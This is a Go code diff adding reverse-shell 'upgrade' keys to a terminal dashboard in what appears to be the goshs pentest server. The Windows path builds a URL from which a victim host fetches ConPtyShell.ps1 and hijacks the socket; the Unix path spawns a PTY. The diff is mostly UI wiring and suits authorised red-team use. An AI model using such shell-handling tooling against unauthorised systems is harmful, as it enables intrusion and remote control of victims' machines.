@@ -314,6 +314,16 @@ func (m *model) handleKey(msg tea.KeyMsg) (tea.Model, tea.Cmd) {
 		if m.active == paneShells {
 			return m, m.attachSelectedSession()
 		}
+	case "u":
+		// Stabilise the selected shell as a Unix PTY (shells pane only).
+		if m.active == paneShells {
+			return m, m.upgradeSelectedSession(false)
+		}
+	case "U":
+		// Stabilise the selected shell via Windows ConPtyShell (shells pane only).
+		if m.active == paneShells {
+			return m, m.upgradeSelectedSession(true)
+		}
 	case "C":
 		// Clear the whole clipboard (clipboard pane only).
 		if m.active == paneClipboard {
@@ -688,7 +698,7 @@ func (m *model) refreshShells() {
 		for _, s := range ln.Sessions {
 			sraw, _ := json.Marshal(s)
 			ssummary := fmt.Sprintf("    ↳ %-15s  session %s", s.RemoteAddr, shortID(s.ID))
-			sdetail := fmt.Sprintf("Session:   %s\nRemote:    %s\nListener:  %s:%d\n\nPress ⏎ or i to attach (Ctrl+] detaches), d to kill.\n", s.ID, s.RemoteAddr, ln.IP, ln.Port)
+			sdetail := fmt.Sprintf("Session:   %s\nRemote:    %s\nListener:  %s:%d\n\nPress ⏎/i to attach (Ctrl+] detaches), u upgrade to PTY,\nU ConPtyShell (Windows), d to kill.\n", s.ID, s.RemoteAddr, ln.IP, ln.Port)
 			p.rows = append(p.rows, eventRow{summary: ssummary, detail: sdetail, accent: lipgloss.Color(nord14), kind: rowSession, raw: sraw})
 		}
 	}
@@ -845,6 +855,66 @@ func (m *model) attachSelectedSession() tea.Cmd {
 	return tea.Exec(&shellBridge{session: sess}, func(err error) tea.Msg {
 		return shellClosedMsg{err: err}
 	})
+}
+
+// upgradeSelectedSession stabilises the selected reverse-shell session,
+// mirroring the web UI's upgrade buttons. The Unix path spawns a PTY via
+// python/script; the Windows path pulls ConPtyShell from this server and
+// hijacks the socket. Both run before attaching — the operator presses ⏎/i once
+// the upgrade has landed. Returns nil so the key handler can fall through when
+// the selection is not a session row.
+func (m *model) upgradeSelectedSession(windows bool) tea.Cmd {
+	if m.mgr == nil || m.active != paneShells {
+		return nil
+	}
+	p := m.panes[paneShells]
+	if len(p.rows) == 0 {
+		return nil
+	}
+	row := p.rows[p.sel]
+	if row.kind != rowSession {
+		m.setFlash("select a session row to upgrade")
+		return nil
+	}
+	var info catcher.SessionInfo
+	if json.Unmarshal(row.raw, &info) != nil || info.ID == "" {
+		m.setFlash("could not identify session")
+		return nil
+	}
+	sess := m.mgr.GetSession(info.ID)
+	if sess == nil {
+		m.setFlash("session no longer connected")
+		return nil
+	}
+	// The attached shell gets the whole terminal, so size the PTY to the full
+	// dashboard dimensions (with sane fallbacks before the first resize).
+	rows, cols := m.height, m.width
+	if windows {
+		upgradeWindows(sess, m.conPtyURL(sess), rows, cols)
+		m.setFlash("sent ConPtyShell upgrade — press ⏎ to attach")
+	} else {
+		upgradeUnix(sess, rows, cols)
+		m.setFlash("sent PTY upgrade — wait a moment, then ⏎ to attach")
+	}
+	return nil
+}
+
+// conPtyURL builds the ConPtyShell download URL for an upgrade. It prefers the
+// local address the victim connected to (so it works even when goshs is bound
+// to 0.0.0.0), falling back to the configured IP and finally to loopback.
+func (m *model) conPtyURL(sess *catcher.Session) string {
+	scheme := "http"
+	if m.opts.SSL {
+		scheme = "https"
+	}
+	host := sess.LocalIP()
+	if host == "" || host == "0.0.0.0" || host == "::" {
+		host = m.opts.IP
+	}
+	if host == "" || host == "0.0.0.0" || host == "::" {
+		host = "127.0.0.1"
+	}
+	return fmt.Sprintf("%s://%s:%d/ConPtyShell.ps1?conpty", scheme, host, m.opts.Port)
 }
 
 // parseListenerAddr accepts "ip:port" or a bare "port" and returns the bind IP
@@ -1318,7 +1388,7 @@ func (m *model) controlsHint() string {
 		case paneSMTP:
 			return "↑↓ event · PgUp/PgDn scroll · s save attachments · e/E export · esc close · q quit"
 		case paneShells:
-			return "↑↓ row · ⏎/i attach · a start · r restart · d stop/kill · e export · esc close · q quit"
+			return "↑↓ row · ⏎/i attach · u/U upgrade · a start · r restart · d stop/kill · esc close · q quit"
 		}
 		return "↑↓ event · PgUp/PgDn scroll · g/G newest/oldest · e/E export · esc close · q quit"
 	}
@@ -1326,7 +1396,7 @@ func (m *model) controlsHint() string {
 	case paneClipboard:
 		return "⇄ Tab/←→ panes · ↑↓ scroll · ⏎ view · a add · d delete · C clear · e export · q quit"
 	case paneShells:
-		return "⇄ Tab/←→ panes · ↑↓ select · ⏎/i attach · a start · r restart · d stop/kill · e export · q quit"
+		return "⇄ Tab/←→ panes · ↑↓ select · ⏎/i attach · u/U upgrade · a start · r restart · d stop/kill · q quit"
 	case paneSMTP:
 		return "⇄ Tab/←→ panes · ↑↓ scroll · ⏎ detail · s save attachments · e/E export · q quit"
 	}
